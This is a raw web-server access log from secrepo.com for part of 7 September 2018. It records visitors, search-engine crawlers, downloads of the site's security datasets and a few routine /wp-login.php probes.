194.228.76.95 - - [07/Sep/2018:11:01:10 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" 
194.228.76.95 - - [07/Sep/2018:11:01:20 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" 
194.228.76.95 - - [07/Sep/2018:11:01:21 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" 
213.175.160.22 - - [07/Sep/2018:11:04:00 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" 
213.175.160.22 - - [07/Sep/2018:11:04:01 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" 
213.175.160.22 - - [07/Sep/2018:11:04:01 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" 
213.175.160.22 - - [07/Sep/2018:11:04:03 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" 
63.88.83.68 - - [07/Sep/2018:11:04:58 -0700] "GET /Datasets%20Description/ HTTP/1.1" 200 577 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
63.88.83.68 - - [07/Sep/2018:11:05:03 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
63.88.83.68 - - [07/Sep/2018:11:05:03 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
63.88.83.68 - - [07/Sep/2018:11:05:03 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
63.88.83.68 - - [07/Sep/2018:11:05:03 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
68.168.89.190 - - [07/Sep/2018:11:07:10 -0700] "GET / HTTP/1.1" 200 12383 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
68.168.89.190 - - [07/Sep/2018:11:07:10 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
194.228.76.95 - - [07/Sep/2018:11:09:11 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" 
194.228.76.95 - - [07/Sep/2018:11:09:19 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" 
194.228.76.95 - - [07/Sep/2018:11:09:20 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" 
111.202.101.97 - - [07/Sep/2018:11:09:43 -0700] "GET /robots.txt HTTP/1.1" 301 481 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
194.228.76.95 - - [07/Sep/2018:11:09:56 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" 
111.202.101.97 - - [07/Sep/2018:11:09:59 -0700] "GET / HTTP/1.1" 301 446 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
111.202.101.97 - - [07/Sep/2018:11:10:00 -0700] "GET /robots.txt HTTP/1.1" 200 252 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
194.228.76.95 - - [07/Sep/2018:11:10:06 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" 
194.228.76.95 - - [07/Sep/2018:11:10:07 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" 
91.228.167.88 - - [07/Sep/2018:11:11:06 -0700] "GET / HTTP/1.0" 301 461 "https://socialmediascanner.eset.com" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36" 
91.228.167.88 - - [07/Sep/2018:11:11:07 -0700] "GET / HTTP/1.0" 200 46201 "http://secrepo.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36" 
111.202.101.97 - - [07/Sep/2018:11:11:21 -0700] "GET / HTTP/1.1" 200 12346 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
18.223.172.176 - - [07/Sep/2018:11:14:28 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36" 
65.246.9.173 - - [07/Sep/2018:11:18:46 -0700] "GET / HTTP/1.1" 200 46212 "-" "Mozilla/4.0 (compatible;)" 
63.88.83.68 - - [07/Sep/2018:11:19:13 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 200 6629420 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
63.88.83.68 - - [07/Sep/2018:11:19:31 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 200 6629420 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" 
209.37.96.18 - - [07/Sep/2018:11:21:49 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
209.37.96.18 - - [07/Sep/2018:11:21:49 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
209.37.96.18 - - [07/Sep/2018:11:21:49 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
209.37.96.18 - - [07/Sep/2018:11:21:50 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
40.77.167.181 - - [07/Sep/2018:11:29:57 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.224 - - [07/Sep/2018:11:31:08 -0700] "GET /self.logs/?C=N;O=D HTTP/1.1" 200 12006 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.2 - - [07/Sep/2018:11:41:35 -0700] "GET /self.logs/error.log.2018-09-04.gz HTTP/1.1" 200 8477 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
100.43.85.128 - - [07/Sep/2018:11:42:41 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/dpd.html HTTP/1.1" 200 1558 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
18.222.108.192 - - [07/Sep/2018:11:43:44 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Trident/5.0 Chrome/67.0.3396.79 Safari/537.36" 
76.21.94.241 - - [07/Sep/2018:11:44:16 -0700] "GET / HTTP/1.1" 200 12383 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
76.21.94.241 - - [07/Sep/2018:11:44:16 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
76.21.94.241 - - [07/Sep/2018:11:44:17 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
176.8.91.217 - - [07/Sep/2018:11:45:26 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "http://sta-grand.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts)" 
176.8.91.217 - - [07/Sep/2018:11:45:27 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "http://sta-grand.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts)" 
176.8.91.217 - - [07/Sep/2018:11:45:28 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "http://sta-grand.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts)" 
207.46.13.242 - - [07/Sep/2018:11:46:03 -0700] "GET /self.logs/error.log.2017-04-06.gz HTTP/1.1" 304 188 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
113.171.224.176 - - [07/Sep/2018:11:48:43 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 46720 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
202.239.4.79 - - [07/Sep/2018:11:49:57 -0700] "GET /Datasets%20Description/Network/notice.html HTTP/1.1" 200 1544 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
64.134.161.41 - - [07/Sep/2018:11:50:37 -0700] "GET / HTTP/1.1" 200 12383 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" 
64.134.161.41 - - [07/Sep/2018:11:50:37 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" 
64.134.161.41 - - [07/Sep/2018:11:50:37 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" 
64.134.161.41 - - [07/Sep/2018:11:50:38 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" 
202.239.4.79 - - [07/Sep/2018:11:50:53 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 200 4274093 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:11:51:47 -0700] "GET /Datasets%20Description/HTML_Bro_log_2 HTTP/1.1" 301 552 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:11:52:40 -0700] "GET /Datasets%20Description/Network/ssh.html HTTP/1.1" 200 1262 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:11:53:26 -0700] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 200 1545 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:11:54:14 -0700] "GET /data HTTP/1.1" 404 340 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:11:54:57 -0700] "GET /maccdc2012/maccdc2012_full_alert.7z HTTP/1.1" 200 24978942 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:11:55:52 -0700] "GET /Datasets%20Description/HTML_Bro_log_1 HTTP/1.1" 301 552 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:11:56:46 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930836 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:11:57:35 -0700] "GET /Datasets%20Description/PE_malware/OPCleaver.html HTTP/1.1" 200 1352 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:11:58:29 -0700] "GET /Datasets%20Description/Network/dns.html HTTP/1.1" 200 1437 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:11:59:14 -0700] "GET /maccdc2012/maccdc2012_fast_alert.7z HTTP/1.1" 200 9478149 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:12:00:01 -0700] "GET /Datasets%20Description/Network/weird.html HTTP/1.1" 200 1539 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
159.65.244.3 - - [07/Sep/2018:12:00:51 -0700] "GET / HTTP/1.1" 200 12327 "-" "Go-http-client/1.1" 
202.239.4.79 - - [07/Sep/2018:12:00:53 -0700] "GET /Datasets%20Description/Network/ssl.html HTTP/1.1" 200 1479 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:12:01:42 -0700] "GET /Datasets%20Description/Network/dhcp.html HTTP/1.1" 200 1355 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:12:01:55 -0700] "GET /tg/tg_snort_full.7z HTTP/1.1" 200 8847794 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:12:03:06 -0700] "GET /Datasets%20Description/Network/signatures.html HTTP/1.1" 404 340 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:12:04:16 -0700] "GET /Datasets%20Description/Network/tunnel.html HTTP/1.1" 200 1364 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:12:05:08 -0700] "GET /Datasets%20Description/PE_malware/Zeus.html HTTP/1.1" 200 1592 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:12:06:32 -0700] "GET /self.logs/ HTTP/1.1" 200 12014 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
162.210.196.130 - - [07/Sep/2018:12:07:06 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.130 - - [07/Sep/2018:12:07:08 -0700] "GET / HTTP/1.1" 200 46156 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
202.239.4.79 - - [07/Sep/2018:12:07:34 -0700] "GET /Datasets%20Description/Network/ftp.html HTTP/1.1" 200 1424 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:12:08:42 -0700] "GET /Datasets%20Description/Network/files.html HTTP/1.1" 200 1426 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
112.135.45.103 - - [07/Sep/2018:12:09:05 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
112.135.45.103 - - [07/Sep/2018:12:09:06 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
202.239.4.79 - - [07/Sep/2018:12:09:42 -0700] "GET /Datasets%20Description/Network/http.html HTTP/1.1" 200 1603 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
202.239.4.79 - - [07/Sep/2018:12:10:35 -0700] "GET /Datasets%20Description/Network/smtp.html HTTP/1.1" 200 1531 "-" "Y!J-ASR/1.0 crawler (https://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)" 
18.219.142.57 - - [07/Sep/2018:12:14:20 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
180.97.35.217 - - [07/Sep/2018:12:17:24 -0700] "GET / HTTP/1.1" 200 12383 "http://www.baidu.com/s?wd=entirequt" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
93.86.74.217 - - [07/Sep/2018:12:25:12 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
93.86.74.217 - - [07/Sep/2018:12:25:12 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
194.228.76.95 - - [07/Sep/2018:12:30:54 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36" 
41.223.160.173 - - [07/Sep/2018:12:34:12 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
134.197.0.24 - - [07/Sep/2018:12:32:31 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 330932242 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
64.254.24.112 - - [07/Sep/2018:12:35:57 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.254.24.112 - - [07/Sep/2018:12:35:57 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.254.24.112 - - [07/Sep/2018:12:35:57 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.254.24.112 - - [07/Sep/2018:12:35:57 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.254.24.112 - - [07/Sep/2018:12:35:57 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.254.24.112 - - [07/Sep/2018:12:36:49 -0700] "GET /maccdc2012/notice.log.gz HTTP/1.1" 200 20779 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.254.24.112 - - [07/Sep/2018:12:38:50 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 200 554524 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
204.62.51.162 - - [07/Sep/2018:12:39:43 -0700] "GET / HTTP/1.1" 200 12383 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0" 
204.62.51.162 - - [07/Sep/2018:12:39:44 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0" 
204.62.51.162 - - [07/Sep/2018:12:39:44 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0" 
204.62.51.162 - - [07/Sep/2018:12:39:45 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0" 
64.254.24.112 - - [07/Sep/2018:12:40:25 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.254.24.112 - - [07/Sep/2018:12:40:27 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.254.24.112 - - [07/Sep/2018:12:40:27 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.254.24.112 - - [07/Sep/2018:12:40:27 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
199.58.86.206 - - [07/Sep/2018:12:42:03 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.206 - - [07/Sep/2018:12:42:05 -0700] "GET / HTTP/1.1" 200 46156 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
73.158.187.146 - - [07/Sep/2018:12:42:06 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
73.158.187.146 - - [07/Sep/2018:12:42:07 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
73.158.187.146 - - [07/Sep/2018:12:42:07 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
73.158.187.146 - - [07/Sep/2018:12:42:07 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
73.158.187.146 - - [07/Sep/2018:12:42:08 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
73.158.187.146 - - [07/Sep/2018:12:42:19 -0700] "GET /Datasets%20Description/Network/dhcp.html HTTP/1.1" 200 1355 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
73.158.187.146 - - [07/Sep/2018:12:42:20 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "http://www.secrepo.com/Datasets%20Description/Network/dhcp.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
207.46.13.26 - - [07/Sep/2018:12:42:28 -0700] "GET /self.logs/error.log.2017-04-02.gz HTTP/1.1" 304 188 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
18.188.94.118 - - [07/Sep/2018:12:43:52 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/602.1" 
173.252.127.33 - - [07/Sep/2018:12:45:47 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" 
64.254.24.112 - - [07/Sep/2018:12:49:48 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.254.24.112 - - [07/Sep/2018:12:49:49 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
64.254.24.112 - - [07/Sep/2018:12:49:50 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0" 
113.171.224.176 - - [07/Sep/2018:12:52:29 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 46720 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
